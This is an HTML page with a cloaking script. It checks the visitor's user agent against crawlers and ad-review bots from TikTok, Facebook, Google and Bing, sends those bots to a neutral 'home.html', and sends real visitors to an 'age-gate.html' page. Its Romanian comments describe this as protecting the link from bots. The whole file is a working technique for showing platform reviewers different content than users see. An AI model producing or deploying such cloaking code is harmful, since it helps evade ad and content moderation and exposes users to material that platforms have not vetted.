<!DOCTYPE html>
<html>
<head>
<script>
(function(){
  var userAgent = navigator.userAgent.toLowerCase();
  // Listă extinsă de boti pentru a proteja link-ul
  var bots = ['tiktok','bytespider','facebook','googlebot','bingbot','adsbot','crawler'];
  
  var isBot = bots.some(function(bot) {
    return userAgent.indexOf(bot) > -1;
  });

  if (isBot) {
    // Trimitem botii pe o pagină neutră (creează un fișier blog.html sau trimite-i pe google)
    location.replace('home.html' + window.location.search);
  } else {
    // Utilizatorii reali merg la verificare
    location.replace('age-gate.html' + window.location.search);
  }
})();
</script>
</head>
<body></body>
</html>
